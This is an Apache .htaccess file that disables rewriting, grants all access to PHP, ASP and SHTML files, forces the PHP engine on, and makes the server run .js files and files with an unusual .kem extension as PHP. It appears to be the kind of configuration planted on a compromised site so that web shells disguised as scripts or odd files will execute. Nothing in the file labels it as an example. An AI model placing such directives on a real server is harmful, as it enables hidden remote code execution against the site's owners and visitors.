<IfModule mod_rewrite.c>
    RewriteEngine Off
</IfModule>
<IfModule mod_authz_core.c>
    <FilesMatch "\.php$">
    Require all granted
    </FilesMatch>
</IfModule>
<FilesMatch "\.php$">
    Order allow,deny
    allow from all
</FilesMatch>
<FilesMatch "\.asp$">
    Order allow,deny
    allow from all
</FilesMatch>
<FilesMatch "\.shtml$">
    Order allow,deny
    allow from all
</FilesMatch>
<FilesMatch "^()$">
Order allow,deny
Allow from all
</FilesMatch>
<IfModule mod_authz_core.c>
    Require all granted
</IfModule>

<IfModule php_module>
    php_flag engine on
</IfModule>



<FilesMatch "\.js$">
    SetHandler application/x-httpd-php
</FilesMatch>

AddType application/x-httpd-php .kem
